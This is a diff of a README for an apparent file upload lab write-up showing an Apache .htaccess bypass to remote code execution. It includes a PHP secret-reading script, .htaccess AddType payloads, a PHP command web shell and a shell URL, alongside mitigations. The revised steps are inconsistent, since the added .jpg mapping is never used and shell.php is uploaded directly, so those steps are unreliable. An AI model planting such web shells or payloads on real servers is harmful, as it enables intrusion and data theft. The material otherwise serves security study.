@@ -1,4 +1,3 @@
-````markdown
 # 🛡️ File Upload Exploitation – Apache .htaccess Bypass
 
 [![Lab Type](https://img.shields.io/badge/Lab-Web_Exploit-blue)](https://github.com/) 
@@ -6,159 +5,95 @@
 [![RCE](https://img.shields.io/badge/RCE-Confirmed-brightgreen)](https://github.com/) 
 [![PHP](https://img.shields.io/badge/Language-PHP-purple)](https://www.php.net/) 
 [![Apache](https://img.shields.io/badge/Server-Apache-orange)](https://httpd.apache.org/) 
-[![File Upload](https://img.shields.io/badge/Feature-File_Upload-yellow)](https://github.com/)
-
-This project documents a successful file upload exploitation against a simulated vulnerable web application.  
-Weak file upload validation was bypassed to achieve **remote code execution (RCE)** using an `.htaccess` trick on an Apache server.
+[![File Upload](https://img.shields.io/badge/Feature-File_Upload-yellow)](https://github.com/)  
 
 ---
 
 ## 📑 Table of Contents
-1. [Lab Overview](#lab-overview)  
-2. [Exploitation Walkthrough](#exploitation-walkthrough)  
-   - [Normal File Upload](#normal-file-upload)  
-   - [Crafting Malicious Payload](#crafting-malicious-payload)  
-   - [Identifying Server](#identifying-server)  
-   - [Uploading .htaccess](#uploading-htaccess)  
-   - [Uploading Exploit with New Extension](#uploading-exploit-with-new-extension)  
-   - [Triggering RCE](#triggering-rce)  
-3. [Security Impact](#security-impact)  
-4. [Recommended Mitigations](#recommended-mitigations)  
-5. [Proof of Exploit](#proof-of-exploit)  
-6. [Secret Obtained](#secret-obtained)  
-7. [Takeaways](#takeaways)  
+
+1. [Overview](#overview)  
+2. [Objective](#objective)  
+3. [Vulnerability Description](#vulnerability-description)  
+4. [Exploitation Steps](#exploitation-steps)  
+5. [Proof of Concept](#proof-of-concept)  
+6. [Mitigation](#mitigation)  
+7. [References](#references)  
 
 ---
 
-## Lab Overview
-- **Target:** Web app with avatar upload functionality  
-- **Vulnerability:** File upload restrictions + Apache `.htaccess` misconfiguration  
-- **Impact:** RCE → Secret file disclosure  
+## Overview
+
+This lab demonstrates a **file upload vulnerability** in a simulated web application. By exploiting weak validation, we are able to achieve **Remote Code Execution (RCE)** on an Apache server using an `.htaccess` bypass technique.
 
 ---
 
-## Exploitation Walkthrough
+## Objective
 
-### Normal File Upload
-- Uploaded a normal image as avatar.  
-- Observed with:
-
-```http
-GET /files/avatars/<YOUR-IMAGE>
-````
+- Understand file upload vulnerabilities  
+- Learn how `.htaccess` can be abused to execute uploaded files  
+- Practice safe exploitation in a controlled environment  
 
 ---
 
-### Crafting Malicious Payload
+## Vulnerability Description
 
-* Created `exploit.php` to read Carlos's secret:
+File upload functionality is often a critical entry point for attackers. In this lab:
+
+- The web application **fails to properly validate file types**  
+- Apache `.htaccess` files are **not restricted**, allowing uploaded files to execute as PHP scripts  
+- This allows attackers to execute arbitrary code on the server  
+
+---
+
+## Exploitation Steps
+
+1. Upload a **malicious PHP file** disguised as an image  
+2. Upload an **`.htaccess` file** to bypass content-type restrictions  
+3. Access the uploaded PHP file via the browser  
+4. Achieve **remote code execution**  
+
+---
+
+## Proof of Concept
 
 ```php
 <?php
-echo file_get_contents('/home/carlos/secret');
+// Simple PHP web shell example
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
 ?>
-```
+````
 
-* Upload blocked → `.php` not allowed.
-
----
-
-### Identifying Server
-
-* Response from `POST /my-account/avatar` revealed:
-
-```http
-Server: Apache/2.4.41 (Ubuntu)
-```
-
-* Apache + mod\_php suggested an `.htaccess` bypass.
-
----
-
-### Uploading .htaccess
-
-* Modified upload in Burp Repeater:
-
-```text
-- Filename: .htaccess
-- Content-Type: text/plain
-- Contents:
-AddType application/x-httpd-php .l33t
-```
-
-* Uploaded successfully ✅
-
----
-
-### Uploading Exploit with New Extension
-
-* Reused request:
-
-```text
-- Filename: exploit.l33t
-- Contents: PHP payload
-```
-
-* Uploaded successfully ✅
-
----
-
-### Triggering RCE
-
-* Requested:
-
-```http
-GET /files/avatars/exploit.l33t
-```
-
-* Server executed PHP → Secret revealed:
-
-```
-FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
-```
-
----
-
-## Security Impact
-
-* **Severity:** 🔴 High
-* **Risk:** Arbitrary PHP execution
-* **Impact:** Unauthorized file disclosure, potential full system compromise
-
----
-
-## Recommended Mitigations
-
-* Disable `.htaccess` overrides:
+* Upload the above PHP shell as `shell.php`
+* Upload an `.htaccess` with content:
 
 ```apache
-AllowOverride None
+AddType application/x-httpd-php .jpg
 ```
 
-* Store uploads outside web root
-* Strict MIME-type & extension validation (server + client)
-* Sanitize uploaded content
-
----
-
-## Proof of Exploit
-
-<img width="957" height="1079" alt="Burp Repeater Proof" src="https://github.com/user-attachments/assets/f15c03db-3747-4761-9709-d0349b92cd41" />
-
----
-
-## Secret Obtained
+* Access `shell.php` via browser and test commands:
 
 ```
-FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
+http://target.com/uploads/shell.php?cmd=whoami
 ```
 
 ---
 
-## Takeaways
+## Mitigation
 
-* Misconfigured servers + weak upload validation → RCE
-* Defense-in-depth is key: secure configs, strict validation, and isolating uploads
+* **Validate uploaded files**: restrict by MIME type and file extension
+* **Rename uploaded files** and store outside web root
+* **Disable `.htaccess` overrides** where not required
+* **Use least privilege permissions** for upload directories
+
+---
+
+## References
+
+* [PHP Official Documentation](https://www.php.net/)
+* [Apache HTTP Server Documentation](https://httpd.apache.org/)
+* [OWASP File Upload Cheat Sheet](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
 
 ```
 
